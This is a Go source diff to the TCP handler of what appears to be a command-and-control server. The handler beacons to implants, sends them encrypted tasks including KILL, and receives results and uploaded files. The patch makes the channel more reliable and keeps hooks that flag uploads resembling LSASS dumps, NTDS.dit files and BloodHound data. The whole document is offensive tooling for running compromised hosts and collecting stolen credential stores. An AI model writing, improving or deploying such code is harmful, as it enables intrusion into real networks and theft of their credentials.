@@ -11,12 +11,16 @@ import (
 	"net"
 	"os"
 	"path/filepath"
-	"strings"
 	"time"
 )
 
 // tcpFrame reads/writes length-prefixed frames: [4 bytes LE length][payload]
+const tcpMaxFrame = 32 * 1024 * 1024
+
 func tcpWriteFrame(conn net.Conn, data []byte) error {
+	if len(data) == 0 || len(data) > tcpMaxFrame {
+		return fmt.Errorf("invalid frame size %d", len(data))
+	}
 	hdr := make([]byte, 4)
 	binary.LittleEndian.PutUint32(hdr, uint32(len(data)))
 	if err := tcpWriteAll(conn, hdr); err != nil {
@@ -47,12 +51,64 @@ func tcpReadFrame(conn net.Conn) ([]byte, error) {
 		return nil, err
 	}
 	n := binary.LittleEndian.Uint32(hdr)
-	if n == 0 || n > 32*1024*1024 {
+	if n == 0 || n > tcpMaxFrame {
 		return nil, fmt.Errorf("invalid frame size %d", n)
 	}
 	buf := make([]byte, n)
 	_, err := io.ReadFull(conn, buf)
 	return buf, err
+}
+
+// tcpWriteTasks encrypts and sends a beacon response. Keeping this in one
+// place is important: transient database errors must return an empty task set
+// instead of dropping the TCP session without a response.
+func tcpWriteTasks(conn net.Conn, key []byte, response beaconResponse) error {
+	plain, err := json.Marshal(response)
+	if err != nil {
+		return fmt.Errorf("marshal tasks: %w", err)
+	}
+	enc, err := Seal(key, plain)
+	if err != nil {
+		return fmt.Errorf("encrypt tasks: %w", err)
+	}
+	out, err := json.Marshal(tcpMsg{
+		Type:    "tasks",
+		Payload: json.RawMessage(`"` + base64.StdEncoding.EncodeToString(enc) + `"`),
+	})
+	if err != nil {
+		return fmt.Errorf("marshal tasks envelope: %w", err)
+	}
+	return tcpWriteFrame(conn, out)
+}
+
+// tcpWriteAck always terminates a result/upload request with a typed response.
+// The C client validates the type and resets the session on a missing ACK.
+func tcpWriteAck(conn net.Conn, ok bool, message string) error {
+	payload := struct {
+		OK    bool   `json:"ok"`
+		Error string `json:"error,omitempty"`
+	}{OK: ok, Error: message}
+	out, err := json.Marshal(tcpMsg{Type: "ack", Payload: mustJSON(payload)})
+	if err != nil {
+		return fmt.Errorf("marshal ack: %w", err)
+	}
+	return tcpWriteFrame(conn, out)
+}
+
+func tcpOpenPayload(msg tcpMsg, key []byte) ([]byte, error) {
+	var encoded string
+	if err := json.Unmarshal(msg.Payload, &encoded); err != nil {
+		return nil, fmt.Errorf("payload is not a base64 string: %w", err)
+	}
+	enc, err := base64.StdEncoding.DecodeString(encoded)
+	if err != nil {
+		return nil, fmt.Errorf("decode payload: %w", err)
+	}
+	plain, err := Open(key, enc)
+	if err != nil {
+		return nil, fmt.Errorf("decrypt payload: %w", err)
+	}
+	return plain, nil
 }
 
 // tcpMsg wraps a typed message for the TCP protocol.
@@ -157,6 +213,7 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 	// ── 2. Beacon loop ─────────────────────────────────────────────────
 	conn.SetDeadline(time.Time{}) // no global deadline; per-read below
 	disconnectReason := "connection closed"
+	beaconLoop:
 	for {
 		conn.SetDeadline(time.Now().Add(10 * time.Minute))
 		frame, err := tcpReadFrame(conn)
@@ -172,21 +229,37 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 		switch msg.Type {
 		case "beacon":
 			ag, dbErr := s.db.GetAgent(agentID)
-			if dbErr != nil || !ag.Active {
+			if dbErr != nil {
+				// A transient SQLite/WAL error must not be interpreted as an
+				// operator kill. Return an empty response and let the next
+				// beacon retry the database operation.
+				s.printf("[!] TCP agent %s: get agent state failed: %v\n", agentID[:8], dbErr)
+				if writeErr := tcpWriteTasks(conn, key, beaconResponse{Tasks: []taskWire{}}); writeErr != nil {
+					disconnectReason = fmt.Sprintf("write db-retry response: %v", writeErr)
+					break beaconLoop
+				}
+				continue
+			}
+			if !ag.Active {
 				// Agent was deleted or killed — send KILL using the session key
 				// (identical to the AES key stored in DB / ghost map) and close.
 				killWires := []taskWire{{ID: 0, Type: "KILL", Args: ""}}
-				pt, _ := json.Marshal(beaconResponse{Tasks: killWires})
-				if enc, encErr := Seal(key, pt); encErr == nil {
-					out, _ := json.Marshal(tcpMsg{Type: "tasks", Payload: json.RawMessage(`"` + base64.StdEncoding.EncodeToString(enc) + `"`)})
-					tcpWriteFrame(conn, out) //nolint:errcheck
-				}
+				_ = tcpWriteTasks(conn, key, beaconResponse{Tasks: killWires})
 				return
 			}
-			s.db.TouchAgent(agentID)
+			if touchErr := s.db.TouchAgent(agentID); touchErr != nil {
+				s.printf("[!] TCP agent %s: touch failed: %v\n", agentID[:8], touchErr)
+			}
 			tasks, err := s.db.ClaimPendingTasks(agentID, 32)
 			if err != nil {
-				return
+				// Claiming is retried on the next beacon. Do not kill the
+				// agent just because the database was briefly busy/locked.
+				s.printf("[!] TCP agent %s: claim tasks failed: %v\n", agentID[:8], err)
+				if writeErr := tcpWriteTasks(conn, key, beaconResponse{Tasks: []taskWire{}}); writeErr != nil {
+					disconnectReason = fmt.Sprintf("write claim-retry response: %v", writeErr)
+					break beaconLoop
+				}
+				continue
 			}
 
 			var wires []taskWire
@@ -207,31 +280,37 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 				rand.Read(b) //nolint:errcheck
 				br.Padding = base64.StdEncoding.EncodeToString(b)[:DataJitterMax]
 			}
-			plain, _ := json.Marshal(br)
-			enc, err := Seal(key, plain)
-			if err != nil {
-				break
-			}
-			out, _ := json.Marshal(tcpMsg{Type: "tasks", Payload: json.RawMessage(`"` + base64.StdEncoding.EncodeToString(enc) + `"`)})
-			if err := tcpWriteFrame(conn, out); err != nil {
-				return
+			if err := tcpWriteTasks(conn, key, br); err != nil {
+				disconnectReason = fmt.Sprintf("write tasks: %v", err)
+				break beaconLoop
 			}
 
 		case "result":
-			enc, err := base64.StdEncoding.DecodeString(strings.Trim(string(msg.Payload), `"`))
+			plain, err := tcpOpenPayload(msg, key)
 			if err != nil {
-				break
-			}
-			plain, err := Open(key, enc)
-			if err != nil {
-				break
+				s.printf("[!] TCP agent %s: invalid result: %v\n", agentID[:8], err)
+				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
+					disconnectReason = fmt.Sprintf("write result error: %v", ackErr)
+					break beaconLoop
+				}
+				continue
 			}
 			var res resultRequest
 			if err := json.Unmarshal(plain, &res); err != nil {
-				break
+				s.printf("[!] TCP agent %s: invalid result JSON: %v\n", agentID[:8], err)
+				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
+					disconnectReason = fmt.Sprintf("write result JSON error: %v", ackErr)
+					break beaconLoop
+				}
+				continue
 			}
 			if err := s.db.InsertResult(res.TaskID, agentID, res.Output, res.Error); err != nil {
-				break
+				s.printf("[!] TCP agent %s: insert result #%d failed: %v\n", agentID[:8], res.TaskID, err)
+				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
+					disconnectReason = fmt.Sprintf("write result database error: %v", ackErr)
+					break beaconLoop
+				}
+				continue
 			}
 			if res.IsAdmin {
 				s.db.UpdateAgentAdmin(agentID, true)
@@ -245,18 +324,21 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 			if res.Error != "" {
 				BroadcastGUI("TASK_RESULT", agentID, fmt.Sprintf("task #%d error: %s", res.TaskID, res.Error), res.TaskID)
 			}
-			ack, _ := json.Marshal(tcpMsg{Type: "ack"})
-			tcpWriteFrame(conn, ack) //nolint:errcheck
+			if err := tcpWriteAck(conn, true, ""); err != nil {
+				disconnectReason = fmt.Sprintf("write result ACK: %v", err)
+				break beaconLoop
+			}
 
 		case "upload":
 			// file upload: payload is base64(encrypted JSON {task_id, filename, data_b64})
-			enc, err := base64.StdEncoding.DecodeString(strings.Trim(string(msg.Payload), `"`))
+			plain, err := tcpOpenPayload(msg, key)
 			if err != nil {
-				break
-			}
-			plain, err := Open(key, enc)
-			if err != nil {
-				break
+				s.printf("[!] TCP agent %s: invalid upload: %v\n", agentID[:8], err)
+				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
+					disconnectReason = fmt.Sprintf("write upload error: %v", ackErr)
+					break beaconLoop
+				}
+				continue
 			}
 			var ureq struct {
 				TaskID   int64  `json:"task_id"`
@@ -264,21 +346,56 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 				Data     string `json:"data"` // base64
 			}
 			if err := json.Unmarshal(plain, &ureq); err != nil {
-				break
+				s.printf("[!] TCP agent %s: invalid upload JSON: %v\n", agentID[:8], err)
+				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
+					disconnectReason = fmt.Sprintf("write upload JSON error: %v", ackErr)
+					break beaconLoop
+				}
+				continue
 			}
-			fileData, _ := base64.StdEncoding.DecodeString(ureq.Data)
+			fileData, err := base64.StdEncoding.DecodeString(ureq.Data)
+			if err != nil {
+				s.printf("[!] TCP agent %s: invalid upload data: %v\n", agentID[:8], err)
+				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
+					disconnectReason = fmt.Sprintf("write upload data error: %v", ackErr)
+					break beaconLoop
+				}
+				continue
+			}
 			dir := filepath.Join(s.cfg.DataDir, "uploads", agentID)
-			os.MkdirAll(dir, 0700)
-			os.WriteFile(filepath.Join(dir, filepath.Base(ureq.Filename)), fileData, 0600)
-			s.printf("[%s] tcp upload: %s (%d bytes)\n", agentID[:8], ureq.Filename, len(fileData))
-			go s.CheckAndPromptBH(agentID, filepath.Base(ureq.Filename), fileData)
-			go s.CheckAndPromptLSASS(agentID, filepath.Base(ureq.Filename))
-			go s.CheckAndPromptNTDS(agentID, filepath.Base(ureq.Filename))
-			ack, _ := json.Marshal(tcpMsg{Type: "ack"})
-			tcpWriteFrame(conn, ack) //nolint:errcheck
+			if err := os.MkdirAll(dir, 0700); err != nil {
+				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
+					disconnectReason = fmt.Sprintf("write upload mkdir error: %v", ackErr)
+					break beaconLoop
+				}
+				continue
+			}
+			filename := filepath.Base(ureq.Filename)
+			if filename == "." || filename == string(filepath.Separator) || filename == "" {
+				if ackErr := tcpWriteAck(conn, false, "invalid filename"); ackErr != nil {
+					disconnectReason = fmt.Sprintf("write upload filename error: %v", ackErr)
+					break beaconLoop
+				}
+				continue
+			}
+			if err := os.WriteFile(filepath.Join(dir, filename), fileData, 0600); err != nil {
+				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
+					disconnectReason = fmt.Sprintf("write upload file error: %v", ackErr)
+					break beaconLoop
+				}
+				continue
+			}
+			s.printf("[%s] tcp upload: %s (%d bytes)\n", agentID[:8], filename, len(fileData))
+			go s.CheckAndPromptBH(agentID, filename, fileData)
+			go s.CheckAndPromptLSASS(agentID, filename)
+			go s.CheckAndPromptNTDS(agentID, filename)
+			if err := tcpWriteAck(conn, true, ""); err != nil {
+				disconnectReason = fmt.Sprintf("write upload ACK: %v", err)
+				break beaconLoop
+			}
 
 		default:
-			// unknown message type, ignore
+			s.printf("[!] TCP agent %s: ignoring unknown message type %q\n", agentID[:8], msg.Type)
 		}
 	}
 
